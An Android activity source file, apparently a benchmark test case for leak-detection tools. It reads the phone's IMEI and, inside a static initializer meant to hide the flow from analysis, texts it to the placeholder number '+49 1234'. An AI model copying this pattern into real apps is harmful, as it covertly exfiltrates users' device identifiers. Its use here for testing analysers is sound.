package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MainActivity extends Activity {
	public static String im;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        im = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
		StaticInitClass1 s1 = new StaticInitClass1();
	}

	public static class StaticInitClass1{
		static{
			SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49 1234", null, im, null, null);  
		}
		
	}
    
}
